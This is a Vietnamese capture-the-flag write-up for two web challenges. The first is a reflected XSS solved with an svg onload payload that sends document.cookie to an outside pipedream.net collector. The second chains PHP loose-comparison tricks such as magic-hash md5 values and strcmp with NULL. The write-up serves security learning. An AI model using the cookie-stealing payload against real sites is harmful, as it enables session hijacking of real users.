# Web
## 1.Hi Hi Hi
    http://146.190.115.228:20109
### Solution:
+ Mình nhập thử text `hacked` thì thấy hiện trên Dom nên mình đoán có thể là lỗi reflect:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325544380_1539785776490524_506576420518357102_n.png?stp=dst-png_p403x403&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=mxRJjvm2h5sAX-IFnMw&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdShnEbKx5Gp4lBumSBFoVxAwb74bLspb0fMNVfKDYhvdw&oe=63EDEAC8)
+ Mình thử nhập `<script>alert(10)</script>` thì bị filter:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325232288_1517370485416235_7328303388423511686_n.png?stp=dst-png_s240x240&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=H8c6WsiYx8oAX-QqT_I&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRiX6GujoIBAJpe-w_pNUJMuDinPcWTvP6VU6nypt-5YA&oe=63EDEFAB)
+ Sau mình dùng burpsuite thì thấy message in ra nằm trong thẻ div:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324403300_562610902450716_1189522020715437705_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=6yIEw5U1lVIAX9zld-t&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTY0ssYhl3oZNB1qfBO3-_ceuEbpJthnSPDJ7RMv_YsZg&oe=63EDE9DC)
+ Mình thử dùng thẻ img mà bị filter,sau mình dùng thẻ svg `<svg onload="alert(10)"/>` thì được thật:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325477432_2098078310381765_4736637555871183436_n.png?stp=dst-png_s320x320&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=jKu7GXo4pP8AX9qvg-l&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSkixswTyARzDg7zpDQLwZu4b0kxf1lCMFazZyQjhCN2A&oe=63EDF35D)
+ Nên mình thử lấy cookie của máy mình `<svg onload="window.location='https://eoudjoqqnbfym00.m.pipedream.net/?cookie='.concat(document.cookie)"/>` thi get duoc cookie:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/323534900_8642520609151521_3244213864135894936_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=lRuhKcBSIhoAX97nNtA&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ6GC-6hq-578_lPfn9EAdr3iu_mZKfmt4P1PExbJeDzA&oe=63EDCE99)
+ Nên mình thử gửi report luôn payload:
`http://127.0.0.1:13337/?message=http://146.190.115.228:20109/?message=%3Csvg+onload%3D%22window.location%3D%27https%3A%2F%2Fexxxxxxxxxxxx00.m.pipedream.net%2F%3Fcookie%3D%27.concat%28document.cookie%29%22%2F%3E` thì nhận được flag.

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325683778_853163225933721_2454076518486329042_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=P1Ocdj5eECoAX8E_sJb&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQxmVbprZ3IDsyaHAJItwRZj36LoTcpkwy5tE0aWTvcgg&oe=63EDD4F2)

> Flag: KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}
## 2.Phpri Phprai
### Topic:
    http://47.254.251.2:8889
### Solution:
+ Mình truy cập vào trang web thì thấy source code:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/322813543_1179131372737339_4021760199972033425_n.png?stp=dst-png_p228x119&_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=kzIGxc6LX0oAX8wVo0k&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ0pDRhJwl1xoOZ4DNMhqm5AJgWz_iahHVSKtjdVAanmg&oe=63EED9DD)

+ Mình thấy bài này là vượt qua so sánh lỏng lẻo toán tử `==` của php,nên hãy đi bắt đầu từng flag:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/323049955_1327220921429635_4229566663682593967_n.jpg?stp=dst-jpg_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Lcd4g8J_lGoAX-RqqVg&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRFYD-bdfjM6ropJDxHuvzxggRzmoK72VmfrsdphIRYoQ&oe=63EEF117)
+ Flag1

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/322599078_1176725533214479_1578787794598973144_n.png?_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=ydTON2wPZRIAX_7rKvM&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRIaiiVahXLjyyH7KTnA_TlnvuGQpWo215GqAkf351Yqg&oe=63EEE60D)

    Bài này là đê vượt qua vòng if thì phải nhập vào 2 chuỗi có giá trị khác nhau nhưng md5 thì phải bằng nhau,
    mình search có dạng đặc biệt đó là 
    md5('240610708') == md5('QNKCDZO')
    Mình gửi ?1=240610708&2=QNKCDZO nhận được flag1
> Flag1 : KCSC{B0_u_Bu_S4
+ Flag2:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324526603_683025153523892_8768434602679411762_n.png?_nc_cat=101&ccb=1-7&_nc_sid=aee45a&_nc_ohc=OkbGC3AcaFkAX_o2Dd6&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTg8QqHKvVIpWSLdX6eAioChsi6QkXI0fsJBLIUJ1DzGQ&oe=63EF0B34)

    Ở đây là so sanh chuỗi mình truyển vào với $$flag phải bằng 0.
    Mình thấy $$flag nó sẽ trả về "" vì chắc kh có khai báo $(value của flag) 
    Mình chỉ cần truyền cho giá trị vào là NULL nữa là ok
    strcmp(NULL, "") => 0
    Chỗ này mình nhập ?3=
> Flag2 : C_8usssssss_htt
+ Flag3:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324453455_555571979835563_7248040904010364804_n.png?_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=I9okEdn0B1wAX93-8O6&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRDg8ai1aUoXHKYuWJUPa8fgNmXoXD9M1ZqoQ4lLWtchw&oe=63EEEA82)

    Chỗ này mình thấy chỗ đầu so sánh giá trị nhập vào phải bằng 1.4e5 mà so sánh chặt thì bắt buộc phải khác
    Mình sẽ chuyển đổi 1.4e5 sang hệ 10 là 140000 
    Chỗ này mình nhập ?4=140000 
> Flag3: ps://www.youtub
+Flag4:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324719822_891765618666228_2347351895924653674_n.png?_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=yB6DdA054yQAX8eCOAb&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTTRkDgM1a737zX90jbwF7x7CX4jTzumZNSwL_QWbIPLg&oe=63EF086A)

    Ý này là nhập vào chuỗi phải == 69 và phải !== 69 và '69'
    Ở đây có thêm hàm trim loại bỏ khoảng trắng 2 đầu và bắt buộc phải có 2 kí tự
    Nên mình thử gửi ?4= 69 ở đây các bạn phải có thêm khoảng trắng ở giữa khi url encode sẽ chuyển thành %20 
    hoặc bạn có thể thử với ?4=+69
> Flag4 : e.com/watch?v=x
+ Flag5:

![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/322015460_880947103330654_5389033022234246472_n.png?_nc_cat=100&ccb=1-7&_nc_sid=aee45a&_nc_ohc=IjgZsVswdyMAX9TCyD2&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSf6H_VmjqwGiCPzDDTHd7nQ_NUcOREkjMxRuqzcSQj9w&oe=63EF0AD6)

    Chỗ này thì bắt chúng ta nhập mỗi chuỗi phải bằng KaCeEtCe 
    Nhưng trước lúc đó thì preg_replace("/$var1/", '', $str6) đã chuyển chuỗi đó thành ''
    Mình chỉ cần truyền giá trị chuỗi vào nằm trong KaCe${var1}EtCe
    ở đây bạn truyền vào chỗ nào cũng được miễn là nằm ở trong chuỗi đó
    Ở đây mình nhập ?6=KKaCeEtCeaCeEtCe

> Flag5:QtC3F8fH6g}

Gộp 5 flag lại với nhau ta được flag cuối cùng
> Flag: KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}


